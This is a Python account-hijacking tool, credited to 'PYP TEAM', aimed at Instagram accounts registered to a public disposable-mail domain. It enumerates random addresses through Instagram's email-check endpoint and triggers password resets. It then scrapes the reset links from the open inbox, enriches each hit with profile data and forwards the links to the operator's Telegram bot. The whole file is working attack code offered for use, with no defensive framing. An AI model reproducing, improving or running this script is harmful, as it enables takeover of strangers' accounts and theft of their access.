import os, re, html, time, uuid, base64, random, string, json, sys, requests
from threading import Thread, Lock
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
try: import httpx
except ImportError: os.system("pip install httpx httpx[http2]"); import httpx
try: from cfonts import render
except ImportError: os.system("pip install cfonts"); from cfonts import render

SAM = '\x1b[1;33m'
kumar = '\x1b[38;5;120m'
A1 = "\x1b[38;5;214m"
A2 = "\x1b[38;5;196m"
A3 = "\x1b[38;5;226m"
A4 = "\x1b[1;37m"
DIM = "\x1b[2;37m"
RESET = "\033[0m"
GOLD = "\x1b[38;5;220m"
CYAN = "\x1b[38;5;51m"
PINK = "\x1b[38;5;213m"
reset = "\033[0m"
dim = "\033[2m"
bold = "\033[1m"
black = "\033[30m"
red = "\033[31m"
green = "\033[32m"
yellow = "\033[33m"
blue = "\033[34m"
magenta = "\033[35m"
cyan = "\033[36m"
white = "\033[37m"
b_red = "\033[1;31m"
b_green = "\033[1;32m"
b_yellow = "\033[1;33m"
b_blue = "\033[1;34m"
b_magenta = "\033[1;35m"
b_cyan = "\033[1;36m"
b_white = "\033[1;37m"
gold = "\033[1;38;5;220m"
dark_gold = "\033[38;5;178m"
silver = "\033[1;38;5;250m"
soft_black = "\033[38;5;242m"
pink = "\033[1;38;5;213m"
teal = "\033[1;38;5;51m"
purple = "\033[1;38;5;129m"
orange = "\033[1;38;5;208m"
rose = "\033[1;38;5;203m"
lime = "\033[1;38;5;154m"
coral = "\033[1;38;5;210m"
sky = "\x1b[1;38;5;117m"
lavender = "\x1b[1;38;5;183m"
deep_blue = "\x1b[1;38;5;27m"
hot_pink = "\x1b[1;38;5;205m"
border = f"{dim}{soft_black}{'═'*63}{reset}"

def _clr():
    os.system('cls' if os.name == 'nt' else 'clear')

def _rule(w=58, col=soft_black):
    print(f"{dim}{col}{'─'*w}{reset}")

def _wide_rule(w=60, col=soft_black):
    return f"{dim}{col}{'═'*w}{reset}"

def _fmt_num(n):
    try:
        n = int(n)
        if n >= 1_000_000:
            return f"{n/1_000_000:.1f}M"
        if n >= 1_000:
            return f"{n/1_000:.1f}K"
        return str(n)
    except:
        return str(n)

def _logo():
    colors = random.choice([
        ['cyan', 'white'], ['white', 'cyan'],
        ['magenta', 'white'], ['white', 'magenta'],
        ['yellow', 'white'], ['white', 'yellow'],
        ['blue', 'cyan'], ['cyan', 'blue'],
        ['magenta', 'blue'], ['blue', 'magenta'],
        ['green', 'cyan'], ['cyan', 'green'],
        ['red', 'white'], ['white', 'red'],
        ['yellow', 'red'], ['red', 'yellow'],
        ['green', 'white'], ['white', 'green'],
        ['cyan', 'magenta'], ['magenta', 'cyan'],
        ['yellow', 'blue'], ['blue', 'yellow']
    ])
    print(render('Jack', colors=colors, align='center'))

def _telegram_bar():
    border = f"{dim}{soft_black}{'═'*71}{reset}"
    print(border)
    print(f"{orange} ➥ {dark_gold}TELEGRAM {white}➤  {silver}@vcxah")
    print(f"{orange} ➥ {dark_gold}JOIN     {white}➤  {silver}@PyJack")
    print(f"{orange} ➥ {dark_gold}TEAM    {white}➤  {silver}PYP TEAM ")
    print(border)
    print()

def _mini_border():
    return f"{dim}{soft_black}{'▬'*63}{reset}"

_clr()
_logo()
print()
_telegram_bar()

chat_id = input("🤖 ᴇɴᴛᴇʀ ᴄʜᴀᴛ ɪᴅ: ")
print(border)
bot_token = input("🔑 ᴇɴᴛᴇʀ ʙᴏᴛ ᴛᴏᴋᴇɴ: ")
print(border)

try:
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    payload = {
    "chat_id": chat_id,
    "photo": "https://i.postimg.cc/K8ZW6HFF/PYP-TEAM-bot-integrated-banner.jpg",
    "caption": (
        "۞ 𝗣𝗬𝗣 𝗧𝗘𝗔𝗠 ۞\n\n"
        "✓ 𝗕𝗢𝗧 𝗜𝗡𝗧𝗘𝗚𝗥𝗔𝗧𝗘𝗗\n"
        "⚡ 𝗥𝗘𝗔𝗗𝗬"
    ),
    "reply_markup": {
        "inline_keyboard": [
            [
                {"text": "👨‍💻 Dev", "url": "https://t.me/vcxah"},
                {"text": "📢 Channel", "url": "https://t.me/PyJack"}
            ]
        ]
    }
}
    response = requests.post(url, json=payload, timeout=30)
    result = response.json()
    if result.get("ok"):
        print("✅ Notification sent! Bot connected successfully!")
    else:
        print("❌ Failed to send notification")
        print("Telegram response:", result)
except requests.RequestException as e:
    print(f"❌ Network error: {e}")
except Exception as e:
    print(f"❌ Error sending notification: {e}")

hits = 0
good = 0
bad = 0
dead = 0
lock = Lock()
used_usernames = set()

def display():
    global hits, good, bad, dead
    stats = (
        f'\n╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n'
        f'│                                            \n'
        f'│        ۞ 𝗣𝗬𝗣 𝗧𝗘𝗔𝗠 ۞                     \n'
        f'│        𓆩 𝗛𝗜𝗧𝗦 𝗠𝗢𝗡𝗜𝗧𝗢𝗥𝗜𝗡𝗚 𓆪          \n'
        f'│                                            \n'
        f'│   ⚜ 𝗚𝗢𝗢𝗗   » {good:<6}  ⚜ 𝗛𝗜𝗧𝗦  » {hits:<6} \n'
        f'│   ✦ 𝗕𝗔𝗗    » {bad:<6}  ✦ 𝗗𝗘𝗔𝗗  » {dead:<6} \n'
        f'│                                            \n'
        f'╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n'
    )
    sys.stdout.write('\033[?25l\033[H\033[J')
    print(stats)
    sys.stdout.flush()

def escape_html(s):
    if s is None:
        return "None"
    return (str(s)
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;"))

def jack_fetch_uid(username):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
        }
        url = f"https://www.instagram.com/{username}/"
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            patterns = [
                r'"profilePage_(\d+)"',
                r'"id":"(\d+)"',
                r'"user_id":"(\d+)"',
                r'ownerId":"(\d+)"'
            ]
            for pattern in patterns:
                match = re.search(pattern, response.text)
                if match:
                    return match.group(1)
        return None
    except Exception:
        return None

def jack_fetch_profile(user_id):
    try:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(user_id), "render_surface": "PROFILE"}),
            "doc_id": "7663723823674585"
        }
        response = ig_session.post(
            "https://www.instagram.com/api/graphql",
            headers={"X-FB-LSD": data["lsd"]},
            data=data,
            timeout=15,
        )
        result = response.json()
        user = result.get('data', {}).get('user', {})
        if not user:
            return None
        return {
            "username": user.get('username'),
            "id": user.get('pk'),
            "full_name": user.get('full_name'),
            "followers": user.get('follower_count', 0),
            "following": user.get('following_count', 0),
            "posts": user.get('media_count', 0),
            "is_private": "Yes" if user.get('is_private') else "No",
            "is_verified": "Yes" if user.get('is_verified') else "No",
        }
    except Exception:
        return None

def jack_send_hit(user, username=None, rest_link=None):
    global hits
    with lock:
        hits += 1
    username_clean = username.split("@")[0] if username else None
    username_display = f"@{username_clean}" if username_clean else "None"
    profile_link = f"instagram.com/{username_clean}" if username_clean else "None"
    extra = None
    if username_clean:
        uid = jack_fetch_uid(username_clean)
        if uid:
            extra = jack_fetch_profile(uid)
    if extra:
        full_name = extra["full_name"] or "None"
        followers = extra["followers"]
        following = extra["following"]
        posts = extra["posts"]
        is_private = extra["is_private"]
        is_verified = extra["is_verified"]
    else:
        full_name = "None"
        followers = "None"
        following = "None"
        posts = "None"
        is_private = "None"
        is_verified = "None"
    user_esc = escape_html(user)
    username_esc = escape_html(username_display)
    rest_esc = escape_html(rest_link) if rest_link else None
    profile_esc = escape_html(profile_link)
    name_esc = escape_html(full_name)
    followers_esc = escape_html(followers)
    following_esc = escape_html(following)
    posts_esc = escape_html(posts)
    private_esc = escape_html(is_private)
    verified_esc = escape_html(is_verified)
    box = f'''
        ⚜ 𝐏𝐘𝐏
     𝐏𝐘𝐏 𝐓𝐄𝐀𝐌
✦ 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐑𝐄𝐏𝐎𝐑𝐓
────────────────────
{full_name}
@{username_display}
✉ {user}
♙ Followers : {followers}
♙ Following : {following}
◆ Private   : {is_private}
↳ Reset   : {rest_link}
↳ Profile : {profile_link}
────────────────────
   DEVELOPED BY @vcxah
   JOIN @PyJack
'''
    rest_html = f'<a href="{rest_esc}">Reset Link</a>' if rest_esc else "None"
    parse_box = (
    "╭─ ⚜ <b>HIT REPORT</b>\n"
    "│\n"
    f"├ 👤 <b>NAME</b>     <code>{name_esc}</code>\n"
    f"├ 🔖 <b>USERNAME</b> <code>{username_esc}</code>\n"
    f"├ 📧 <code>{user_esc}</code>\n"
    "│\n"
    f"├ 👥 <b>FOLLOWERS</b> <code>{followers_esc}</code>\n"
    f"├ 👥 <b>FOLLOWING</b> <code>{following_esc}</code>\n"
    f"├ 🔒 <b>PRIVATE</b>   <code>{private_esc}</code>\n"
    "│\n"
    f"├ 🔗 {rest_html}\n"
    f"├ 🌐 <code>{profile_esc}</code>\n"
    "│\n"
    "╰─ ⚙ <b>Dev</b> @vcxah"
    )
    try:
        with open('Jackhits.txt', 'a') as ff:
            ff.write(f'{box}\n')
    except:
        pass
    try:
        requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            data={
                "chat_id": ID,
                "text": parse_box,
                "parse_mode": "HTML",
                "disable_web_page_preview": "true",
            },
            timeout=15,
        )
    except:
        pass

def jack_trigger_reset(full_email):
    try:
        ig_did = str(uuid.uuid4()).upper()
        mid = base64.b64encode(uuid.uuid4().bytes).decode()[:32]
        headers = {
            "User-Agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-ig-app-id": "567067343352427",
            "x-ig-device-id": ig_did,
            "x-ig-connection-type": "WIFI",
            "x-ig-capabilities": "3brTvw==",
            "x-ig-www-claim": "0",
            "x-requested-with": "XMLHttpRequest",
            "x-csrftoken": "missing",
            "Cookie": f"ig_did={ig_did}; mid={mid}; csrftoken=missing",
            "Origin": "https://www.instagram.com",
            "Referer": "https://instagram.com/accounts/password/reset/?source=fxcal",
        }
        resp = httpx.Client(http2=True, timeout=20).post(
            "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
            data={"email_or_username": full_email},
            headers=headers,
        )
        body = (resp.text or "").lower()
        ok = resp.status_code == 200 and '"status":"fail"' not in body and '"status": "fail"' not in body
        return ok
    except Exception as e:
        pass
        return False

def jack_grab_reset(email, max_wait=30, interval=3):
    h = {
        'accept': '*/*',
        'content-type': 'application/json',
        'origin': 'https://mailforspam.com',
        'referer': 'https://mailforspam.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36',
    }
    deadline = time.time() + max_wait
    attempt = 0
    while time.time() < deadline:
        attempt += 1
        time.sleep(interval)
        try:
            r = requests.get(
                f'https://api.mailforspam.com/api/mailboxes/{email}/emails',
                params={'page': '1', 'page_size': '100', 'sort_by': 'date', 'sort_order': 'desc'},
                headers=h,
                timeout=15,
            ).json()
        except Exception as e:
            continue
        emails = r.get("emails") or []
        if not emails:
            continue
        di = emails[0]["id"]
        try:
            body = requests.get(
                f'https://api.mailforspam.com/api/mailboxes/{email}/emails/{di}',
                headers=h,
                timeout=15,
            ).json().get("body_html", "") or ""
        except Exception as e:
            continue
        m = re.search(r'https?://[^\s"\'<>]*accounts/password/reset/confirm/\?[^\s"\'<>]*', body)
        if m:
            rest_link = html.unescape(m.group(0))
            u = re.search(r'Hi\s+([A-Za-z0-9._]+)\s*,', body)
            username = u.group(1) if u else None
            return di, rest_link, username
    return None, None, None

def jack_process_reset(email):
    if not jack_trigger_reset(email):
        return None, None, None
    return jack_grab_reset(email, max_wait=30, interval=3)

def jack_check_target(email):
    global bad, good, dead
    try:
        display()
        url = "https://i.instagram.com/api/v1/users/check_email/"
        response = httpx.Client(http2=True).post(
            url,
            data=f"email={email}",
            headers={
                'User-Agent': "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)",
                'content-type': "application/x-www-form-urlencoded; charset=UTF-8"
            }
        )
        if 'email_is_taken' in response.text:
            di, rest_link, username = jack_process_reset(email)
            if di:
                jack_send_hit(email, username, rest_link)
                with lock:
                    good += 1
            else:
                with lock:
                    dead += 1
        else:
            with lock:
                bad += 1
        display()
    except Exception as e:
        pass

def jack_spawn_worker():
    while True:
        if random.random() < 0.5:
            charset = string.ascii_lowercase
        else:
            charset = string.ascii_lowercase + "0123456789"
        chosen_user = ''.join(random.choice(charset) for _ in range(random.choice([3, 4, 5])))
        with lock:
            if chosen_user in used_usernames:
                continue
            used_usernames.add(chosen_user)
        email = chosen_user + "@mailforspam.com"
        jack_check_target(email)

ig_session = requests.Session()
token = bot_token
ID = chat_id

if __name__ == "__main__":
    with ThreadPoolExecutor(max_workers=50) as executor:
        for _ in range(15):
            executor.submit(jack_spawn_worker)